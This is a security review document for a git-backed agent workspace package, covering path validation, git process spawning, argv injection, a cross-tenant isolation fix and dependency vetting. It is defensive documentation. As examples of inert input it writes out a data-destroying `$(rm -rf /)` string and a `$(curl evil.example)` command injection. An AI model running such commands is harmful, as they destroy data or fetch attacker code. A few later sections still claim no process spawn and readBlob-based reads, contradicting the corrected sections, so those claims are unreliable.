# Security — `@ax/workspace-git-core`

This package is the implementation behind the `workspace:*` contract. It exports one function — `registerWorkspaceGitHooks` — that registers **six** service hooks (the four base ones, `workspace:apply`, `workspace:read`, `workspace:list`, `workspace:diff`, plus the two Phase 3 bundle hooks, `workspace:apply-bundle` and `workspace:export-baseline-bundle`) on a host-side bus and stores every snapshot in a bare git repository at `<repoRoot>/<workspaceId>.git`, where `workspaceId` is derived from the calling `agentId` — one repo per agent, never one for the deployment. **Linear-history-only by construction:** every `workspace:apply` is a CAS on `refs/heads/main`. There are no branches, no merges, no rebase. The `WorkspaceVersion` opaque string happens to be a 40-hex commit SHA today, but subscribers MUST treat it as opaque (Invariant 1).

**One** consumer wraps this core: `@ax/workspace-git`, the in-process plugin for single-pod / local-CLI deployments. It imports the core directly and calls `registerWorkspaceGitHooks` at `init()` time. It is also the **chart's default** (`workspace.backend: local`), which makes this the code that serves production unless an operator opts out.

This paragraph used to promise a second consumer, `@ax/workspace-git-http`, "wrapping the same `registerWorkspaceGitHooks` and exposing the four hooks over HTTP", and concluded that both shared this security profile "because the code is the same". No such package exists. The multi-replica backend is `@ax/workspace-git-server`, it does **not** depend on this package and never calls `registerWorkspaceGitHooks` — it is a separate implementation with its own storage tier and its own SECURITY.md. We're spelling that out rather than quietly deleting a line, because the belief that the two backends shared one implementation is a decent part of how TASK-396 went unnoticed: the isolation work landed in the sharded one, and everyone assumed this one inherited it. It didn't. It had none.

So: this note covers **this** code and nothing else. Read `@ax/workspace-git-server`'s own note for that backend.

## Security review (workspace-git-core)

- **Sandbox:** Filesystem reach is fenced to `<repoRoot>/<workspaceId>.git`, and `workspaceId` is a `ws-` prefix plus 16 hex chars — a caller cannot steer it at a directory of their choosing; every write goes through `isomorphic-git`'s object-db (no caller-supplied path ever reaches `fs.writeFile` directly), and `validatePath` rejects `..`, absolute, NUL, backslash, and `.git` segments before any blob is written. No network — we don't ship `isomorphic-git`'s `http` variant. We **do** spawn the real `git` binary (bundle hooks, and the read paths since TASK-73) — no shell, argv arrays only, a closed hard-coded child env that does not inherit `process.env`, and a pinned `PATH`; see **Process spawn** below, which used to claim the opposite.
- **Injection:** `FileChange.content` is opaque `Uint8Array` written via `git.writeBlob` — never interpolated into a shell, path, SQL, or URL. Agent-supplied `reason` lands in the commit message only; agent-supplied `agentId`/`userId`/`sessionId` land in `WorkspaceDelta.author` only and are never used as the git author/email (those are hard-coded `ax-runner`).
- **Supply chain:** Two runtime deps, both pinned exact: `isomorphic-git@1.37.5` (MIT, established maintainer set, no install hooks) and `picomatch@4.0.4` (MIT, Jon Schlinkert / micromatch org, no install hooks). Transitive surface is mostly self-contained pure-JS git plumbing; one entry (`simple-get`) is network-capable but unreachable from the code paths we use.

## Sandbox escape / capability leakage

The capability budget for this code is one directory and zero of everything else. Here's how each axis lands:

### Filesystem reach

`repoRoot` comes from caller config and never from a hook payload — it's set once when `registerWorkspaceGitHooks` is called. Everything we write goes under `<repoRoot>/<workspaceId>.git/` via `isomorphic-git`'s `gitdir` parameter, and the only input to `workspaceId` is the bus-supplied caller identity, hashed. The library writes loose objects into `objects/`, refs into `refs/`, packs into `objects/pack/`, and that's it. No part of this code path ever calls `fs.writeFile` with a caller-supplied path string — paths from `FileChange` go to `git.writeBlob` as content, not as filenames, and the resulting OID is the only thing that hits the FS.

For the writes that DO touch caller-supplied filenames (the path inside the tree object), `validatePath` (`impl.ts`) runs BEFORE the mutex is taken so a bad input fails fast and can't deadlock. It rejects:

- Empty / non-string paths.
- NUL bytes (which would otherwise truncate when crossing into native syscalls).
- Leading `/` (absolute paths).
- Backslashes (the workspace contract is POSIX; Windows separators get an explicit "no").
- Empty segments, `.`, and `..` (which would otherwise traverse out of the repo if a future backend resolved them naively).
- Any segment named `.git` (defense-in-depth; we don't currently materialize the working tree, but if a future backend does, this prevents writing into the metadata dir).

Reads, lists, and diffs take a `path` parameter that is resolved **inside the git object database**, never against the host filesystem. Since TASK-73 these go through the git binary as `git cat-file blob <oid>:<path>` and `git ls-tree -r -z --name-only <oid>` (not iso-git's `readBlob`/`listFiles`, whose `fs.read` adapter could coalesce a transient short read into a silently wrong answer — see `__tests__/null-slice-race.test.ts`). Either way the lookup is a tree-entry lookup: `..` in that position asks for an entry literally *named* `..` inside the tree, which does not exist, and you get a not-found. There is no host-FS traversal vector on the read side even without `validatePath`. What the read paths DO depend on is the identity gate — `<oid>` and the gitdir are chosen by `requireAgent`, not by the caller.

### Process spawn

**Yes — we spawn the real `git` binary, and this section used to say we didn't.**

It read: *"None. We confirmed by inspection that `impl.ts` imports only `node:fs`, `node:path`, `isomorphic-git`, `picomatch`, and `@ax/core`. No `child_process`, no `execa`, no `spawn`, no shell."* Line 1 of `impl.ts` is `import { spawn } from 'node:child_process'`. The claim went stale when the read paths migrated to the git binary (TASK-73 / PR #71) and nobody came back here. We're leaving the old wording quoted above rather than silently swapping it, because "a doc that confidently describes a capability we don't have" is its own finding — and this one survived two review passes of a PR *about* false isolation claims before someone checked it against line 1.

What actually spawns, and why:

- **The bundle hooks** (`workspace:apply-bundle`, `workspace:export-baseline-bundle`). `isomorphic-git` has no bundle support at all — not create, not verify, not fetch-from-bundle. The bundle wire is the contract with the runner, so short of reimplementing the pack format, real `git` is the only option.
- **The read paths** (`workspace:read`, `workspace:list`, and `diff`'s snapshot reads) use `git cat-file blob` and `git ls-tree` rather than `git.readBlob` / `git.listFiles`, because iso-git's `fs.read` adapter coalesces transient short reads into a silent wrong answer (the null-slice race — see `__tests__/null-slice-race.test.ts`). We took a spawn over a backend that can quietly return the wrong bytes.

Why it's safe, all of which is real code in `runGit` / `runGitBinary`:

- **No shell, ever.** `spawn('git', argsArray)` with an array — there is no shell to inject into, so `;`, backticks, `$(…)` and friends are inert argument text.
- **`process.env` is NOT inherited.** The child gets a closed, hard-coded env (`GIT_PROCESS_ENV`): `GIT_CONFIG_NOSYSTEM=1`, `GIT_CONFIG_GLOBAL=/dev/null`, `GIT_TERMINAL_PROMPT=0`, `HOME=/nonexistent`, a fixed `PATH`, and the pinned `ax-runner` author identity. No system or global gitconfig is read, so no `core.fsmonitor`/`core.pager`-style config-to-code vector, and no host secret reaches the child.
- **`PATH` is a closed list**, not the ambient one, so a malicious `git` earlier on the operator's `$PATH` can't be picked up.
- **`stdio` is `['ignore','pipe','pipe']`** — no stdin, so nothing can drive an interactive prompt.

### Argv injection

The argv arrays are built from OIDs and validated paths, never from raw caller text, and they are passed as an **array** — so the worst case is a malformed argument, not a second command.

Caller-influenced values that reach argv: `input.baselineCommit`, resolved commit OIDs, the bundle's new tip, and `FileChange.path`. The OIDs are either produced by `git` itself or, for `baselineCommit`, checked against a locally-computed baseline before anything is written (a mismatch throws before `gitdir` is touched). Paths have already been through `validatePath`.

The one shape worth naming: an argument that *starts with a dash* is read by `git` as a flag rather than a value, and none of our call sites use a `--` separator.

Being precise about this, because the easy version of this paragraph is an overclaim. **`WorkspaceVersion` is not validated.** `asWorkspaceVersion` in `@ax/core` is a bare cast — no regex, no length check — and `resolveVersion` passes `input.version` straight through. So a `version` DOES become the leading characters of an argv token: on its own in `git ls-tree -r -z --name-only <version>`, and as the prefix of `<version>^{commit}` and `<version>:<path>`.

What keeps that from being a hole today is the set of callers, not a check:

- `version`/`from`/`to` on `read`, `list` and `diff` are supplied by **host-side** plugins, which pass back a version this backend previously minted. `workspace:diff` has no production caller at all.
- The **runner** — the one semi-trusted caller — cannot reach them. The `workspace.read` IPC handler forwards only `path`, never a version. Its one version-shaped input is `parentVersion` on `workspace.commit-notify`, and that lands in `git rev-parse --verify <v>^{commit}`, whose non-zero exit throws **before** anything is written to the gitdir. `baselineCommit` is re-derived host-side and never taken from the wire.
- Worst case for a malformed value is therefore a failed `git` invocation, not a write or a disclosure.

That is a caller-discipline argument, which is weaker than a validated input. Validating `WorkspaceVersion` at the `@ax/core` boundary (or passing `--` at these call sites) would turn it into a structural one, and is filed as a follow-up. If a future change ever routes a free-form caller string into a positional argument, do that first.

### Env vars

None read at the caller's direction. `repoRoot` comes from config, the bot author identity is hard-coded, and there is no `process.env[someCallerValue]` anywhere in `impl.ts`. Note the asymmetry with the section above: we do not *read* env, but we do *construct* a fixed env for the git children, and `GIT_PROCESS_ENV` deliberately starts from `{}` rather than spreading `process.env`.

### Network

None. We import `isomorphic-git`, NOT `isomorphic-git/http/node` — the network-capable HTTP variant is a separate sub-export that this package never references. The transitive dep `simple-get` is pulled in because `isomorphic-git`'s package.json lists it as a dependency, but it's only invoked from the `http` code paths, which we don't touch. If we ever add `git.clone` / `git.push` / `git.fetch`, network capability arrives with them and that's a separate review.

## Tenant isolation

This is the section we should have written the first time. Until TASK-396 this
package kept **one** bare repo for the whole deployment and ignored the caller's
identity on every read. Two users on the same host shared a tree. One of them
opened their own Files tab and got the other's file. We are not going to dress
that up: it was a cross-tenant read on a live deployment, and it shipped because
the isolation story lived in the *other* backend and nobody checked that this one
had it too.

How it works now:

- Every hook resolves the caller to `ws-<16 hex>` = `sha256(JSON.stringify([agentId]))`,
  and reads/writes `<repoRoot>/<that>.git`. Different agent, different repo. The
  derivation is a byte-for-byte copy of `@ax/workspace-git-server`'s, so the two
  backends name the same workspace the same way; both sides pin the same test
  vectors so a drift fails loudly instead of orphaning repos.
- **It fails closed.** A caller with a blank `agentId` gets a
  `workspace-identity-required` error, not a default tree. There is no shared
  fallback repo left for an unauthenticated-ish caller to land in — the
  identity check runs before path validation, before the mutex, before any
  filesystem call.
- **One agent, one workspace — the partition is `agentId`, not `(userId, agentId)`.**
  That is deliberate and it is the same rule the sharded backend adopted in
  TASK-257: an agent's files belong to the agent, and every user authorized to
  reach it sees the same tree. Which means **this hash is a partition, not an
  access control**. The thing that decides whether you may reach an agent at
  all is the `agents:resolve` ACL that `channel-web`'s workspace routes run
  before every per-agent read (any error → 404). If that gate is ever bypassed
  or moved after the read, nothing downstream will save you.
- The `agentId` comes from the bus `ctx`, which callers build from an
  authenticated session plus an agent `agents:resolve` has already approved.
  This package trusts that and can't second-guess it: a caller that mints a
  synthetic `agentId` gets its own private bucket keyed on that string. Still
  not any real agent's tree — but it is why "who fills in ctx" is a
  security-relevant question one layer up.

**Upgrading an existing deployment:** the old `<repoRoot>/repo.git` is no longer
read by anything. We do NOT migrate or delete it, because nothing in it records
which agent wrote which file — guessing would be worse than leaving it. Operators
should treat it as what it is (a tree every user of that deployment could read)
and delete it once they've salvaged anything they want.

## Prompt injection / untrusted content

The agent and the model can influence three things this code sees: the `path` of a `FileChange`, the `content` bytes, and the `reason` string. None of these get treated as code.

### LLM output

Never reaches this code directly. Tools running in the sandbox may compute path strings from model output and send them up through the tool-result channel, but by the time those strings hit `workspace:apply` they've crossed the IPC bridge and are validated by `validatePath` before any FS-adjacent operation. The `safePath`-style checks (no `..`, no absolute, no `.git`, no NUL, no `\`) are a single chokepoint — there's no second path-validation lurking in `read`/`list`/`diff` because those paths resolve against the git object-db, which is structurally safe.

### Tool output

`FileChange.content` is `Bytes` (`Uint8Array`). It's written verbatim via `git.writeBlob` and read back verbatim via `git.readBlob`. We never decode it, never interpret it as JSON or a shell command, never log it, never interpolate it. A blob containing `$(rm -rf /)` is just 14 bytes that go into the object-db and come back out as 14 bytes.

We do make a defensive copy of incoming bytes in `applyChanges` (`impl.ts`) so a caller mutating their input buffer after `apply` returns can't poison our snapshot, and another defensive copy on the way out of `read` and `readBlobBytes` so a subscriber mutating the returned buffer can't poison whatever isomorphic-git might cache or share.

### Agent-supplied `reason`

Flows into the git commit message via `git.commit({ message: input.reason ?? 'workspace apply' })` (`applyChanges` in `impl.ts`). isomorphic-git serializes this into the commit object byte-for-byte; there's no shell, no template, no `eval`. A `reason` containing `\n--no-verify\n` or `$(curl evil.example)` is just text that ends up in the commit body.

That said: subscribers of the future `workspace:applied` subscriber hook MUST NOT shell-interpolate or `exec` the `reason`. If a notification subscriber pipes commit messages into a system shell ("send a Slack message that says: $reason"), they own that injection. We treat `reason` as untrusted on the producer side — anyone reading it downstream needs to do the same.

### Agent-supplied provenance

`ctx.agentId`, `ctx.userId`, and `ctx.sessionId` flow into `WorkspaceDelta.author` (`buildDelta` in `impl.ts`) and from there into the `applied` subscriber hook payload. They are NOT used as the git `author.name` / `author.email` — those are the hard-coded `BOT_AUTHOR = { name: 'ax-runner', email: 'ax-runner@example.com' }` (`BOT_AUTHOR` in `impl.ts`). The agent never gets to sign a commit as someone else. Anyone running `git log` on the repo sees `ax-runner` as the author of every commit; the human/agent provenance lives in the bus payload, where subscribers know to treat it as untrusted metadata rather than verified identity.

## Supply chain

Two runtime deps. Both pinned to exact versions in `package.json` (no `^` or `~`).

### `isomorphic-git@1.37.5`

- **License:** MIT.
- **Pin:** Exact (`"isomorphic-git": "1.37.5"`).
- **Maintainers:** `wmhilton` (William Hilton, project lead since 2017), `mojavelinux` (Dan Allen), `jcubic` (Jakub Jankiewicz). Established maintainer set, ~6+ years of releases, project is the de facto pure-JS git library on npm.
- **Install hooks:** None that fire on consumer install. `npm view isomorphic-git@1.37.5 scripts` returns `start`, `format`, `build`, `test`, `publish-website`, `prepublishOnly`, `semantic-release`, `add-contributor`. The only lifecycle script that npm/pnpm runs automatically is `prepublishOnly`, and that fires when the maintainer publishes the package, not when we install it. There is no `preinstall`, `install`, `postinstall`, or `prepare` script — confirmed.
- **Why pure-JS matters here:** the entire reason this code can claim "no process spawn" is that `isomorphic-git` doesn't spawn `git`. It implements the git object format, pack format, and ref handling in JavaScript. That's a much larger code surface than shelling out — but it's a code surface we can read, audit, and pin a hash of, instead of inheriting whatever `/usr/bin/git` happens to be on the host.
- **Transitive surface (notable entries from `npm view ... dependencies`):**
  - `clean-git-ref@^2.0.1` — ref-name validation. Tiny, pure JS.
  - `crc-32@^1.2.0` — checksums. Pure JS, pinned widely across the ecosystem.
  - `pako@^1.0.10` — zlib in pure JS. Used to compress git objects. Established library.
  - `sha.js@^2.4.12` — SHA hashing in pure JS. Used for git's content-addressed storage.
  - `async-lock@^1.4.1`, `pify@^4.0.1`, `readable-stream@^4.0.0`, `minimisted@^2.0.0`, `ignore@^5.1.4`, `diff3@0.0.3` — utility/plumbing.
  - `simple-get@^4.0.1` — HTTP client. **Network-capable, but only reached from the `isomorphic-git/http/node` sub-export**, which this package does not import. We're paying the disk-space cost without granting the capability to our code paths.

  None of the above have install hooks at the versions resolved. The transitive set is consistent with a "pure-JS git plumbing" claim; nothing here phones home, reads env vars at import, or shells out.

### `picomatch@4.0.4`

- **License:** MIT.
- **Pin:** Exact (`"picomatch": "4.0.4"`).
- **Maintainers:** `jonschlinkert` (Jon Schlinkert, micromatch org), `mrmlnc`, `doowb`, `danez`. Established npm maintainers; `picomatch` is the glob engine behind `chokidar`, `micromatch`, `fast-glob`, and most of the file-watching ecosystem. Weekly downloads in the hundreds of millions.
- **Install hooks:** None. `npm view picomatch@4.0.4 scripts` returns `lint`, `test`, `mocha`, `test:ci`, `test:cover` — all dev-time. No `preinstall`, `install`, `postinstall`, or `prepare`.
- **Use:** `workspace:list` calls `picomatch(input.pathGlob, { dot: true })` (the `workspace:list` handler in `impl.ts`) when the caller passes a glob, and filters the listed paths through it. The matcher receives caller-supplied glob strings, but the matcher's output is just a boolean over already-validated path strings — even a maliciously crafted glob can at worst match too few or too many files, not escape the repo. The `{ dot: true }` flag means we don't silently hide entries starting with `.`.
- **Known concerns:** glob libraries have historically had ReDoS issues. `picomatch` mitigates by compiling the glob to a regex with bounded backtracking, but a sufficiently pathological glob could still spike CPU. The glob comes from a host-side caller today (the runner, not the agent); when sandbox-side tools are allowed to specify `pathGlob`, this is worth re-checking.

## Boundary review

- **Alternate impl this hook could have:** `@ax/workspace-postgres` — same four service hooks, but storing snapshots as content-addressed blobs in Postgres (path → bytes per version, with parent pointers). The `WorkspaceVersion` would be a UUID or a hash-of-rows, not a SHA. Service hook signatures don't change; the implementation behind them does.
- **Payload field names that might leak:** none. `WorkspaceVersion` is opaque (the fact that it's a SHA today is documented as an implementation detail). `FileChange` uses `path` / `kind` / `content`. `WorkspaceDelta` uses `before` / `after` / `changes` / `reason` / `author`. No `commit`, `sha`, `oid`, `tree`, `ref`, `gitdir`, or other git-specific vocabulary leaks across the hook surface. The `repoRoot` config is plugin-local, not on any payload.
- **Subscriber risk:** subscribers MUST treat `before` / `after` as opaque strings — if a subscriber tries to parse them as 40-hex SHAs, they break the day a Postgres-backed alternate impl ships.
- **Wire surface (IPC):** none. The only consumer (`@ax/workspace-git`) runs in-process and has no wire surface. (The multi-replica backend, `@ax/workspace-git-server`, has one — but it does not use this code, so it is reviewed in its own SECURITY.md, not here.)

## Known limits

- **Unique writer per `gitdir`.** A `Mutex` **per agent** (`impl.ts`, `class Mutex` + the `mutexes` map in `registerWorkspaceGitHooks`) serializes applies to one agent's repo within one process. Two different agents write to two different repos, so serializing them against each other would buy nothing. The only consumer maintains the "single writer per `gitdir`" property by construction: `@ax/workspace-git` runs in the host process and there is only one host. If a future deployment shape ever runs two `registerWorkspaceGitHooks` callers against the same `repoRoot`, the in-process mutex stops being enough and we need an external lock (advisory lock in Postgres, or a real ref-update CAS).
- **No GC.** Failed applies leave dangling blobs and trees in `objects/`. `isomorphic-git` doesn't ship a `git gc` equivalent, and we don't run one. Disk usage grows monotonically with churn; for the MVP this is fine, but a long-lived repo will eventually want a sweeper.
- **No working-tree materialization.** This code is bare-repo only. Tools that need a checkout (e.g., a build that compiles a project) get bytes via `workspace:read` and write to a scratch dir themselves. That's a deliberate capability minimization — checkouts mean filesystem reach beyond the owner's bare repo, which would expand the sandbox story.
- **No commit signing.** All commits are unsigned. If we ever need to prove provenance from the git history alone (rather than from the bus audit log), we'll need to plumb a signing key. Not on the roadmap; the bus audit log is the source of truth for provenance.
- **`reason` length and content are unchecked.** A 10MB commit message would be silently accepted. Practical exploit surface is low (it ends up in the commit body, not a shell), but if storage costs matter we may add a length cap.

## What we don't know yet

- Whether the `WorkspaceVersion`-as-SHA leak via timing or content-addressed observability matters in a multi-tenant deployment. Two tenants who both `apply` the same exact bytes will produce the same SHA. That's deterministic by design, but it leaks the existence of identical content across tenants if both can observe `WorkspaceVersion`. The Postgres-backed alternate impl with random version IDs sidesteps this; the git-backed impl can't without changing the commit's parent or author bytes per tenant.
- How `workspace:applied` subscribers should handle a `reason` that contains a newline or a control character. We'll punt on this until that subscriber hook lands and we have a concrete subscriber to design against.
- Whether the per-repo mutex should also serialize reads. Today reads run concurrently with writes (isomorphic-git reads from immutable object files, so the worst case is reading a slightly stale ref), but if a future backend has weaker isolation we may need to revisit.

## Security contact

If we find a hole, we'd rather hear about it from you than read about it on Hacker News. Please email `vinay@canopyworks.com`.
